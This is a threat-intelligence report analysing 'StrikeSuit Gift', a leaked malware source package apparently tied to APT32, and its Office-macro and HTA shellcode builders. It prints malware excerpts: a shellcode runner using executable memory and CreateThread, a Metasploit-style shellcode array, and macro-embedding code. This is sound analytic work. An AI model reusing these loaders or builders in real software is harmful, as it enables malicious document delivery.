This is a rough markdown version of the PDF https://stairwell.com/wp-content/uploads/2022/04/Stairwell-threat-report-The-origin-of-APT32-macros.pdf

# StrikeSuit Gift and the Origin Story of APT32 Macros

Steve Miller and Silas Cutler

## Prologue

> _“The gifts of an enemy are justly to be dreaded.” Voltaire_

_Everyone loves an origin story_. When the world learns of new malware and attacks, we are often left pondering the motivations, mulling over the attribution, and sifting through the nitty gritty bits and bytes to understand the TTPs and tradecraft. Why was it done, who was behind it, and how did they do it? Analysts, researchers, and investigators of all sorts spend time plotting the dots, drawing connections between data points, helping the evidence speak, and passing judgment on areas of uncertainty. 

When we dive deep into malware and attacks, we often are left interpreting nuanced artifacts to help us get a glimpse into the original malware development environment. We look to debug information and [PDB paths](https://www.mandiant.com/resources/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware) to make inferences about the developer workstations. We look to the [Rich Header](https://www.youtube.com/watch?v=ipPAFG8qtyg&t=1s) metadata to help understand the specifics of the linker, compiler and architecture of the original development machine. We examine [specific malicious functions](https://securelist.com/scarcruft-surveilling-north-korean-defectors-and-human-rights-activists/105074/) within a piece of malware to identify code reuse. We identify notable libraries to tease out [pieces of software that may be borrowed](https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf) from public projects around the internet.

Part of the fun of analysis is the challenge of the puzzle, and the relentless pursuit of insight in the face of complex, limited, or opaque data. Yet sometimes we get lucky, and we stumble on a piece of malware source code to get a more intimate look at the malware author, a clearer window into the original development environment, and a naked look at the malware itself.

This origin story is for all you Visual Basic macro fans out there. In this blog, we unearth a demon from the ancient world, a mysterious malware source code package called **_StrikeSuit Gift_**. We examine this source code package in detail, and dive deep into development conventions, tradecraft, toolmarks, and potential connections to the threat actor __APT32__.

---

## Contents

- [__Chapter I__](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#chapter-i)
  - [The StrikeSuit Gift that Keeps Giving](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#the-strikesuit-gift-that-keeps-giving)
  - [Summarizing the Source](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#summarizing-the-source)
- [__Chapter II__](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#chapter-ii)
  - [A Tale of ~Three GUIs](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#prologue)
  - [A Song as Old as Rhyme: Office Macros](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#a-song-as-old-as-rhyme-office-vba-macros)
- [__Chapter III__](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#chapter-iii)
  - [Looking the Gift Horse in the Mouth](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#looking-the-gift-horse-in-the-mouth)
    - [How did the RAR get made?](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#how-did-the-rar-get-made)
    - [Unboxed Source Code Projects](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#unboxed-source-code-projects-at-a-glance)
    - [What's the Deal With All this Shellcode?](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#whats-the-deal-with-all-this-shellcode)
    - [The Typical VB Macro Content](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#the-typical-vb-macro-content)
- [__Chapter IV__](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#chapter-iv)
  - [StrikeSuit Malware Development Conventions](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#strikesuit-malware-development-conventions)
  - [Feature Testing, Housekeeping and Fingerprints](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#feature-testing-housekeeping-and-fingerprints)
  - [Development In Progress](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#development-in-progress)
  - [Borrowed and Repurposed Open Source Code](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#borrowed-and-repurposed-open-source-code)
- [__Chapter V__](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#chapter-v)
  - [Stockpiling the Unique Toolmarks and Indicators](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#stockpiling-the-unique-toolmarks-and-indicators)
  - [Threadwork of Attribution and Assessing Connections to APT32](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#threadwork-of-attribution-and-assessing-connections-to-apt32)
- [__Epilogue__](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#epilogue)
- [__Appendix__](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/README.md#appendix)

---

## Chapter I

> _“Gifts are scorned where givers are despised.” Dryden_

### The StrikeSuit Gift That Keeps Giving

Our thirst for knowledge leads us back in time to the foregone world of 2017. The year was a dystopia of its own, yet it was the golden age of APT32. The prolific Vietnam-based threat actor was running wild targeting foreign governments, dissidents and journalists, and pretty much any private corporation trying to do business in Vietnam. APT32, also known under monikers “OceanLotus'' and “BISMUTH”, is famous for innovating and bypassing defenses using a combination of custom-developed, open-source and commercially available tooling to perform intrusion activities. Like many threat actors, APT32 favors phishing via lure documents laden with malicious macros to execute or download a piece of malware. 

Through following the breadcrumbs of historical macro content, we stumbled across an archive submitted to VirusTotal in late 2017. This archive contains a litany of malware source code, shellcode, test files, documents, macros, notes, and more, all of which could span nearly a decade of malware development. This malware source package is internally named StrikeSuit Gift, and though it appears to be developed years ago, dissecting this malware may give us insights to the practices used by malware developers today. Furthermore, through inspection of the minutiae, we may establish links to support the gut notion that this source code package was developed or used by APT32.

### Summarizing the Source

Occasionally malware developers will inadvertently leak source code packages by triggering antivirus or endpoint detection products. Once the security vendor has a copy of the malware file, it may be shared or otherwise proliferated around the globe through data sharing partnerships, backchannel exchanges and product integrations, and eventually, all roads lead to Rome. The StrikeSuit Gift source package was submitted to VirusTotal at `2017-08-26 07:29:19 UTC`.

The _StrikeSuit Gift_ package is a 2.99MB RAR archive containing over 200 files, most of which are Visual Studio solutions or source code in a couple of programming languages, but this package also includes test documents, text files, built executables, and a couple other RAR and ZIP files. 

There’s a lot of data here and multiple timelines to look at. To help illustrate this package at a high level, here’s a look at the directory tree three levels deep, with parentheses to show the last modified timestamp, according to WinRAR. These timestamps are squirrly and imperfect, but they suggest a general timeline and give us a sense of recency that we can dive into more detail later.

_File tree of StrikeSuit Gift RAR 2cac346547f90788e731189573828c53_
```
P17028 - StrikeSuit Gift - Office Macro Type 1 (2017-08-25 21:32)
├── AVs-Test                       (2017-08-25 03:10)
│   └── Result.txt
├── Office-Versions                (2017-08-25 21:32)
│   └── Verions.txt
├── ReadMe.txt                     (2017-08-10 01:25)
├── Reference
│   ├── Macros_Builder
│   │   ├── Macros_Builder         (2017-08-24 01:21)
│   │   ├── Macros_Builder.sln
│   │   ├── Macros_Builder.v11.suo
│   │   └── _Cleanup.bat           (2013-10-29 00:18)
│   ├── Macros_Builder_1.0.zip
│   │   └── Macros_Builder         (2016-04-19 05:32)
│   ├── RawShellcode               (2017-08-23 00:24)
│   │   └── 2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin
│   ├── WebBuilder
│   │   ├── HtaDotNet              (2017-08-24 01:21)
│   │   └── ShellcodeLoader        (2017-08-18 04:50)
│   └── WebBuilder.rar
│   │   └── WebBuilder             (2011-09-23 20:30)
│   │       ├── HtaDotNet          (2011-09-23 20:30)
│   │       └── ShellcodeLoader    (2011-09-23 20:30)
└── Source
    ├── CSharp                     (2017-08-23 21:30)
    │   ├── MacrosEmbedding        (2017-08-18 00:18)
    │   ├── MacrosEmbeddingExample (2017-08-13 19:52)
    │   └── VbaCodeCreator         (2017-08-23 21:30)
    ├── C_Cpp                      (2017-08-23 03:45)
    │   ├── Binary                 (2017-08-24 01:21)
    │   └── ShellcodeThreadCaller  (2017-08-24 01:21)
    └── VB                         (2017-08-20 21:23)
        ├── ShellcodeLoader        (2017-08-20 21:23)
        └── XmlScriptAnalyst       (2017-08-16 20:17)
```

At first glance we can see that as of August 2017 this project was in active development. It seems that the malware author may have brought in older projects and files from years past. These files may have been archives of their own and are kept in the directory structure for reference, or in case the developer needs to pull the ripcord and recover back to the original older code. 

`Macros_Builder` is from 2016 and gets new updates in August 2017. `HtaDotNet` and `ShellcodeLoader` are older, maybe as far back as 2011 but were both touched in August 2017. There is a cleanup batch script that may have been created or used as far back as 2013, but was copied over to help delete extraneous development artifacts. We will dive into more details further down the page, but we think the superficial totality of these timestamps show a developer who is leaning on old code, making improvements, performing tests, and enhancing a small set of interconnected malware tools. 

---

## Chapter II

> _“Unwelcome is the gift which is held long in the hand.” Seneca_


### A Tale of ~Three GUIs

Within the delicate web of source code lie three juicy GUIs for us to behold. We begin with the oldest and jump further back in time to October 2013, when a malware developer compiles a debug build of `Office Macros Builder - Version 1.0.0` at `2013-10-08 16:00:51`. This GUI tool is to help a legion of intrusion operators inject macros into Office documents.

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/01-Office%20Macros%20Builder.png "Office Macros Builder - Version 1.0.0")

GUIs for hacking tools and malware kits exist to help intrusion operators perform complex tasks quickly and easily, repeatedly, reliably. GUIs help scale out capabilities across a workforce of varying roles, skills, and experience levels. Once you can make it a button, almost anyone can smash that easy button to unleash their evils. 

The `Office Macros Builder - Version 1.0.0` above accepts an Office file (.doc) and a Macros (.vb or .txt) and uses Microsoft.Office.Interop.Word and Microsoft.Vbe.Interop assemblies to jam the macro into the document. The program takes the document and creates an alternate data stream (ADS) with a Zone Identifier of 0 to indicate that it is from “URLZONE_LOCAL_MACHINE”, the most trusted zone.

Time marches on and we fast forward to spring 2016. Somewhere around the world, the development team behind _StrikeSuit Gift_ start their morning with coffee and pastries, and compile the GUI program `Embed Office Macros` at `2016-03-11 09:02:13`.

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/02-Embed%20Office%20Macros%202017.png "Embed Office Macros, 2016")
 
We jump ahead to 2017 when the [threat actor is outed by Mandiant](https://www.mandiant.com/resources/cyber-espionage-apt32). The bosses demand an upgrade from their malware developer team. Now, the malware developer `Rachael` is suddenly tasked to enhance an older code base to make it a bit more versatile for intrusion operations. Rachael begins with some slight modifications to the older macro text, `add_schedule_vba.txt`, make some enhancements to the GUI and then they compile the new version of `Embed Office Macros` at `8/17/2017 08:18:44`. 

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/03-Embed%20Office%20Macros%202017.png "Embed Office Macros, 2017")

While looking at the pretty pictures may not necessarily give us foresight into the future of this malware toolkit, the visual progression of these GUIs is important because this is where the many malware functionalities bear fruit. These GUIs represent the final vehicles for mass malware operations, and will be used to create hundreds, if not thousands of malicious macros for Office documents.

### A Song as Old as Rhyme: Office VBA Macros

Let’s take a quick break from the timeline and recap the ever-loathed scourge of the infosec world, Microsoft Office macros. 

Visual Basic (VB), Visual Basic Scripts (VBS) and Visual Basic for Applications (VBA) are basically the same programming language, except that VBA is designed to be run within a Microsoft Office application such as Word, Excel, PowerPoint, etc. In the context of malware and phishing documents, we often just refer to any VB scripting content as “[macros](https://www.ncsc.gov.uk/guidance/macro-security-for-microsoft-office).”

Every IT administrator and business person will tell you that macros have a legitimate purpose and are integral to some crucial company process. The supposed legitimate purpose is exactly why malicious macros are so effective in phishing campaigns. Macros are so common in cross-company, cross-business processes that many users are easily coerced into executing even the malicious ones. Attackers know this and act accordingly.

If you’re new to VB macros or maybe want a quick refresher, we recommend these great reads to recap what macros are, and examples how they may show up in phishing or lure documents:
- https://www.ncsc.gov.uk/guidance/macro-security-for-microsoft-office 
- https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/ 
- https://redcanary.com/blog/malicious-excel-macro/ 
- https://twitter.com/JohnLaTwC/status/775689864389931008 

## Chapter III

> _“To the noble mind, rich gifts wax poor when givers prove unkind.” Shakespeare_

Now, we'll jump to late August 2017 when someone on the malware development or operation team makes a crucial mistake. `Rachael` or one of their counterparts transfers the RAR archive of _StrikeSuit Gift_ to a machine with antivirus software running. The embedded shellcode and macro content inside of the RAR trigger an AV signature and the archive file is hoovered up and blasted across the internet. Those monitoring recent submissions to VirusTotal would see an alert for the YARA rule “`APT32_ActiveMime_Lure`” and arrive at the RAR archive for _StrikeSuit Gift_.

### Looking the Gift Horse In the Mouth

It's tough to analyze this much malware source code line by line, so let’s do our best to summarize the high points and tease out juicy deets that may be interesting to our understanding of the actor’s capabilities, the development tradecraft, and then we can connect what we’re seeing here to attacks out in the world. 

#### How did the RAR get made? 

We do not have many clues to describe how the main RAR file was created, however we can take an educated guess that it was created with WinRAR 4.x for the folder on the mounted volume `D:\P17028 - StrikeSuit Gift - Office Macro Type 1`.

Inside the main RAR file (MD5 `2cac346547f90788e731189573828c53`) we see that the archive stores each of the archived files and directories with a four byte “mtime” timestamp, likely representing the NTFS Last Modified time from Windows. 

If we open this RAR file with WinRAR, the utility identifies this as RAR 4.x archive. According to the documentation, the RAR 4.x format stores the last modified timestamps in local time rather than UTC. This is not important, because we’re skeptical about timestamps to begin with, but good to know that in older versions of WinRAR we should see a four-byte combo of MS-DOS TIME and DATE local timestamps. 

In modern versions of WinRAR, the default is “high-precision” eight-byte uint64 Windows FILETIME UTC timestamps, but if we deselect the high-precision flag, the timestamp becomes a four-byte uint32 Unix time_t. Isn’t forensics fun?

These three examples were created based on the original _StrikeSuit Gift_ RAR file, looking at the RAR last modified timestamp for `\Office-Versions\Verions.txt`. We took this file and re-archived it using a modern WinRAR both with and without the high-precision flag, and the time there reflects a +5 adjustment for the UTC offset on our test system. We can convert any of these raw timestamps back to a human time to see the approximate modification time.

_Examples of three possible archive timestamps made by WinRAR of different versions._

|Last Modified Hex | Time Type | Human Time | WinRAR |
| --- | --- | --- | --- |
| `84 B1 19 4B` | MS-DOS TIME + DATE | `8/25/2017 22:12:08`* | 4.x |
| `52 DB FE 19 19 1E D3 01` | Windows FILETIME | `8/26/2017 03:12:08` | 5.0+ |
| `08 E7 A0 59` | Unix time_t | `8/26/2017 03:12:08` | 5.0+|

The * for 4.x is nuanced. We can try doing it based on this approach https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-dosdatetimetofiletime, or we can try this (easier?) manual approach https://www.doubleblak.com/m/blogPosts.php?id=7#dosTime with the endian swap binary output in CyberChef.

To sum all of that up, we can guess based on the age of the _StrikeSuit Gift_ RAR file that this was created with an old 4.x version of WinRAR and we can confirm that with the structure of the archive headers and the format of the now deprecated DOS style timestamps. Ok, let’s power forward to the good stuff.

---

#### Unboxed Source Code Projects ~At-A-Glance

To help us get a broad vision of all the source code in our _StrikeSuit Gift_ package, we take a high-level look at the main projects.

Parent Directory: `P17028 - StrikeSuit Gift - Office Macro Type 1`

##### ├────── /Macros_Builder/Macros_Builder.sln - Visual Studio 2012

This GUI program “`Embed Office Macros`” was created in 2016 and modernized in August 2017.

The main program defines macro file `add_schedule_vba.txt` as a resource, then the main routine takes that macro and replaces variables from things in GUI and writes out to `MacrosSource.txt`. The program has a separate functionality to take a GUI selected file and use `Trinet.Core.IO.Ntfs` to write an Alternate Data Stream (ADS) Zone Identifier to 2.

##### ├────── /WebBuilder/HtaDotNet/HtaDotnet.sln - Visual Studio 2012

This solution has several components. The first is the HtaDotnet project which appears to have UI components and serve as a framework to embed shellcode and file data into an HTA document with either VB script or javascript. This has two resource objects DotNet4Ldr and DotNetLdr which appear to be serialized versions of `L.dll` (see `ShellcodeLoader`, below) 

The `Test` project uses HtaDotnet to manually build an HTA file based on hard-coded paths for shellcode, a file and a file name. 

```csharp
byte[] shellcode = File.ReadAllBytes(@"c:\temp\shl.bin");
byte[] embedFileData = File.ReadAllBytes(@"c:\temp\bintext.exe");
string embedFileName = "中文(简体).exe";
…
HtaDotNetBuilder builder = new HtaDotNetBuilder();
byte[] hta = builder.BuildHtaDotnetLdr(
   engine,
   shellcode,
   embedFileName,
   embedFileData
            );
File.WriteAllBytes(@"c:\temp\11.hta", hta);
```

##### ├────── /WebBuilder/ShellcodeLoaderL.sln - Visual Studio 14, 14.0.25420.1

(was migrated, see `UpgradeLog.htm`)

This solution is a set of functions that help with decoding, decrypting, and running shellcode. Including that which may be in a text in a .HTA or .VBS file.

The L class is designed to take some script content and decode or decrypt it into shellcode and execute it. 

The Test piece uses the L class and does takes an input shellcode file, an input loader file (“`L.dll`”) two VB loader resources and outputs into a text file.

```csharp
string inputShellcodeFile = @"G:\WebBuilder\Gift_HtaDotNet\_Temp\shl.bin";
string inputLdrFile = @"G:\WebBuilder\Gift_HtaDotNet\ShellcodeLoader\L\bin\release\l.dll";
string outputFile = @"c:\temp\l.txt";
string vbsLdrCompatFile = @"c:\temp\DotNetLdr";
string vbsLdrCompatFileDotNet4 = @"c:\temp\DotNet4Ldr";
```
##### ├────── /CSharp/MacrosEmbedding/MacrosEmbedding.sln - Visual Studio 14, 14.0.25420.1

This GUI program “`Office Macros Builder`” was created in 2013. It checks GUI for inputs of an Office (.doc) and a macro file (.vb or .txt) and attempts to embed macro into a file (with some basic error handling) and tries to adjust ADS zone identifiers to 0.

##### ├────── /CSharp/MacrosEmbeddingExample/MacrosEmbeddingExample.sln - Visual Studio 14, 14.0.25420.1

This is likely a precursor or run alongside `MacrosEmbedding` to test macros embedding functionality. It creates a simple VB macro text, has an embedMacro function to embed a macro into a doc, and the main function takes hard-coded paths from the developer system and runs it.

```csharp
string pathDoc = @"C:\Users\Rachael\Desktop\MacrosTest.doc";
```

We see the function embedMacros from this expanded upon in both other CSharp/ solutions: `MacrosEmbedding`, and `VbaCodeCreator`.

##### ├────── /CSharp/VbaCodeCreator/VbaCodeCreator.sln - Visual Studio 14, 14.0.25420.1

This solution defines resource `vba_code_builder.txt`, attempts to read shellcode from a file, the resource .txt into a string, convert the shellcode into text and VB-ify it, then add the shellcode to the VB text by replacing variables. The `Core.cs` keeps the `embedMacros` function to write to an office document. The main program takes two hard-coded paths, one for shellcode and one for an office document, then runs the core to build the shellcode into it.

```csharp
string strShellcodePath = @"D:\P17028 - StrikeSuit Gift - Office Macro Type 1\Reference\RawShellcode\2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin";
string strOfficeFilePath = @"C:\Users\Rachael\Desktop\test.doc";
Core.Core.startBuilder(strShellcodePath, strOfficeFilePath);
```

Along with this project in the Debug directory we keep a copy of `test.doc` and a handful of legitimate Microsoft Office binaries to support the functionalities.

`Test.doc` has a `Module1.bas` VBA code stream that uses an old public VB script template but then has a function for shellcode as an array. The shellcode in the existing test.doc is a test file similar, if not identical, to the “`RawShellcode`” file `2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin`

##### ├────── /C_Cpp/Binary/Binary.sln - Visual Studio 2012

This reads in a shellcode blob, converts the binary to text and writes to an output .dat file. 

```cpp
int main(int argc, char **argv) {
	std::string strFilePath = "D:\\P17028 - StrikeSuit Gift - Office Macro Type 1\\Reference\\RawShellcode\\2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin";
	std::vector<BYTE> data;
	data = Binary::ReadBinaryFile(strFilePath);
Binary::ConvertBinaryToText("C:\\Users\\Rachael\\Desktop\\shellcode.dat", data);
```

##### ├────── /C_Cpp/ShellcodeThreadCaller/ShellcodeThreadCaller.sln - Visual Studio 2012

This reads in shellcode from a hard-coded path and executes it.

```cpp
HANDLE hFile = CreateFileA("C:\\Users\\Rachael\\Desktop\\2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
LPVOID lpShellcodeAddr = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpShellcodeAddr, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

##### ├────── /VB/ShellcodeLoader/ShellcodeLoader.sln - Visual Studio 2012

This is a different `ShellcodeLoader` than the `L.dll` one in `WebBuilder`.

In this solution, the main `ShellcodeLoader.vb` routine uses the Metasploit VB generated template (a la scriptjunkie) and comments out the Meterpreter-esque shellcode array and instead reads the local test shellcode blob in as the main variable. 

```vbscript
Hyeyhafxp = My.Computer.FileSystem.ReadAllBytes("./2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin")
```

##### └────── /VB/XmlScriptAnalystXmlScriptAnalyst.sln - Visual Studio 2012

This appears to be a test project to test VB code against the local system and build an XML scheduled task based on VB functions. When run it grabs the local system computer and user name, then writes this into an XML string, which is then written out to a hard-coded path `XmlStr.txt`. This relates to the XML functionality brought into an updated version of `Macros_Builder`.

---

#### What’s the Deal With All this Shellcode?

Interwoven through the _StrikeSuit Gift_ package, amidst the varying projects, solutions, and macros, are a handful of shellcode blobs. Are they malware? What are they? Why are they here? Let’s find out. 

##### The One from ShellcodeLoader.vb

File Path: `P17028 - StrikeSuit Gift - Office Macro Type 1\Source\VB\ShellcodeLoader\ShellcodeLoader\ShellcodeLoader.vb`
MD5 of Decoded Raw Shellcode: `509d2e572bd945a2afb4a52d5acd7bec`
File Size: `195b`

This array is the default shellcode blob originally seen in `ShellcodeLoader.vb`, though it is commented out.

```vbscript
'Hyeyhafxp = {232, 137, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, _
'139, 114, 40, 15, 183, 74, 38, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, _
'13, 1, 199, 226, 240, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, _
'116, 74, 1, 208, 80, 139, 72, 24, 139, 88, 32, 1, 211, 227, 60, 73, 139, 52, 139, 1, _
'214, 49, 255, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, _
'36, 117, 226, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, _
'139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, _
'235, 134, 93, 106, 1, 141, 133, 185, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, _
'224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, _
'187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 99, 97, 108, 99, 0}
```

With some fiddling we can take this array and [using Cyberchef perform a From Decimal and dump out the raw hex](https://gchq.github.io/CyberChef/#recipe=From_Decimal('Space',false)MD5(/disabled)&input=MjMyIDEzNyAwIDAgMCA5NiAxMzcgMjI5IDQ5IDIxMCAxMDAgMTM5IDgyIDQ4IDEzOSA4MiAxMiAxMzkgODIgMjAgMTM5IDExNCA0MCAxNSAxODMgNzQgMzggNDkgMjU1IDQ5IDE5MiAxNzIgNjAgOTcgMTI0IDIgNDQgMzIgMTkzIDIwNyAxMyAxIDE5OSAyMjYgMjQwIDgyIDg3IDEzOSA4MiAxNiAxMzkgNjYgNjAgMSAyMDggMTM5IDY0IDEyMCAxMzMgMTkyIDExNiA3NCAxIDIwOCA4MCAxMzkgNzIgMjQgMTM5IDg4IDMyIDEgMjExIDIyNyA2MCA3MyAxMzkgNTIgMTM5IDEgMjE0IDQ5IDI1NSA0OSAxOTIgMTcyIDE5MyAyMDcgMTMgMSAxOTkgNTYgMjI0IDExNyAyNDQgMyAxMjUgMjQ4IDU5IDEyNSAzNiAxMTcgMjI2IDg4IDEzOSA4OCAzNiAxIDIxMSAxMDIgMTM5IDEyIDc1IDEzOSA4OCAyOCAxIDIxMSAxMzkgNCAxMzkgMSAyMDggMTM3IDY4IDM2IDM2IDkxIDkxIDk3IDg5IDkwIDgxIDI1NSAyMjQgODggOTUgOTAgMTM5IDE4IDIzNSAxMzQgOTMgMTA2IDEgMTQxIDEzMyAxODUgMCAwIDAgODAgMTA0IDQ5IDEzOSAxMTEgMTM1IDI1NSAyMTMgMTg3IDIyNCAyOSA0MiAxMCAxMDQgMTY2IDE0OSAxODkgMTU3IDI1NSAyMTMgNjAgNiAxMjQgMTAgMTI4IDI1MSAyMjQgMTE3IDUgMTg3IDcxIDE5IDExNCAxMTEgMTA2IDAgODMgMjU1IDIxMyA5OSA5NyAxMDggOTkgMA), and we can hash it into MD5: `509d2e572bd945a2afb4a52d5acd7bec`. When we pull this snippet of shellcode up with the tool [scdbg](http://sandsprite.com/blogs/index.php?uid=7&pid=152) we see that it probably is just a placeholder that uses WinExec to open passed arguments, and that makes sense because through googling around the strings we can see that this shellcode is borrowed verbatim from several open source code projects surrounding Metasploit VB macros, such as this [blog post by @scriptjunkie in 2012](https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/), which was later tweaked, forked and copied into a plethora of other macros and forms around the internet.

##### The One from test.doc

File Path: `P17028 - StrikeSuit Gift - Office Macro Type 1\Source\CSharp\VbaCodeCreator\VbaCodeCreator\bin\Debug\test.doc`
MD5: `3a2e9ca1d063405668d0c134abfa79dc`
Size of Document: `1.13 MB (1182720 bytes)`
MD5 of Module1: `0c16c5188ac653ebcc8b6098b619ec0e`
Size of Module1: `405757`

This is a big document. We know from the context this will likely have macro content so we open it up using oledump to look at the internal streams, and we can see several chunks of macro content, many of which will need to be parsed out for us to read it more clearly.

```
oledump test.doc
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7265 '1Table'
  5:       460 'Macros/PROJECT'
  6:        95 'Macros/PROJECTwm'
  7: M  682475 'Macros/VBA/Module1'
  8: m  459686 'Macros/VBA/NewMacros'
  9: m     948 'Macros/VBA/ThisDocument'
 10:      4190 'Macros/VBA/_VBA_PROJECT'
 11:       623 'Macros/VBA/dir'
 12:      4096 'WordDocument'
```

The embedded macro is easy to carve out, thanks to Didier Steven’s outstanding tool oledump. When we extract `Module1` we see the VB script with functions that itemize out a two dimensional array, which is later re-assembled and executed from 30 shellcode functions and nearly 1500 sub-arrays. After we extracted and converted the arrays, we ended up with a shellcode buffer.  At this point, something strange happened. 

<explain>

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/04-DLL%20Main%20Executed%20Successfully.png "DllMain has been executed successfully!")



##### The One from RawShellcode

File Path: `P17028 - StrikeSuit Gift - Office Macro Type 1\Reference\RawShellcode\`
File Name: `2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin`
MD5: `37626b974a982e65ea2786c3666bd1a7`
File Size: `72.99 KB (74740 bytes)`

We spelunked through all the source code and saw many references to what we believe is this file. This piece of shellcode, hereafter referred to as “the blob,” is cited in ShellcodeThreadCaller/Main.cpp under the path `C:\\Users\\Rachael\\Desktop\\2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin`

In `VbaCodeCreator/Program.cs` the blob is referenced under the path `D:\P17028 - StrikeSuit Gift - Office Macro Type 1\Reference\RawShellcode\2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin` to be built into the office file “`test.doc`”

This blob is also referenced in `P17028 - StrikeSuit Gift - Office Macro Type 1/Source/C_Cpp/Binary/Binary/Main.cpp`, which parses this file and converts each byte to an integer value. The converted file is saved to "`C:\\Users\\Rachael\\Desktop\\shellcode.dat`".

And in `VB/ShellcodeLoader/ShellcodeLoader.vb` the default shellcode array from the Metasploit post is commented out and instead blob is to be read in as `Hyeyhafxp = My.Computer.FileSystem.ReadAllBytes("./2017-08-23 02-55-49 (2136a783457c7bd8e2f8be9300cb772f).bin"`)

With this name so specific, and having also located a file by this name within the overall package, we are probably safe in assuming that the references within the source are indeed the file with MD5 `37626b974a982e65ea2786c3666bd1a7`. If that’s the case, we move forward with the next assumption that this developer is using this blob for testing, and trying to make sure that this piece of shellcode works within all of their tooling. But what is this blob, exactly? Let’s find out.

Looking at the blob alone, we can see that it does not have a sort of standard file header. Starting at offset `0x00C0`, there are parts of a Windows PE header, which is always a good indication that we may be looking at an executable file, wrapped in a shellcode loader.  

```
000000a0: aa7a a105 78fb 0bf9 5a45 df5a 7fe1 d104  .z..x...ZE.Z....
000000b0: 75f7 5aed 08e2 fbf8 94f8 ae87 0e1f ba0e  u.Z.............
000000c0: 00b4 09cd 21b8 014c cd21 5468 6973 2070  ....!..L.!This p
000000d0: 726f 6772 616d 2063 616e 6e6f 7420 6265  rogram cannot be
000000e0: 2072 756e 2069 6e20 444f 5320 6d6f 6465   run in DOS mode
000000f0: 2e0d 0d0a 2400 0000 0000 0000 4073 b402  ....$.......@s..
00000100: 0412 da51 0412 da51 0412 da51 1f8f 4451  ...Q...Q...Q..DQ
```

When we load this up in a disassembler like IDA Pro, the first four bytes at the start of the file are converted to a call instruction, which through a subsequent call, leads to a function at offset `0xF684`, which is responsible for decoding the remainder payload of the blob.

![alt text](https://github.com/stvemillertime/StrikeSuit-Gift/blob/main/images/05-IDA%20Stuff.png "IDA Stuff")

As we started reverse engineering this shellcode function to understand at a granular level, how the payload is deployed, we identified a 2019 blog post from Qi Anxin about this group's HTA downloaders, which analyzed a version of this shellcode loader and our findings were consistent. Contrary to their findings, our shellcode did not deploy a remote access tool, but presented us with a message box saying “_DllMain has been executed successfully!_”.

During our testing, we also found the `ShellcodeThreadCaller` code, included in this trove of data, made for an excellent resource to test this shellcode.  
	
<insert cool video>

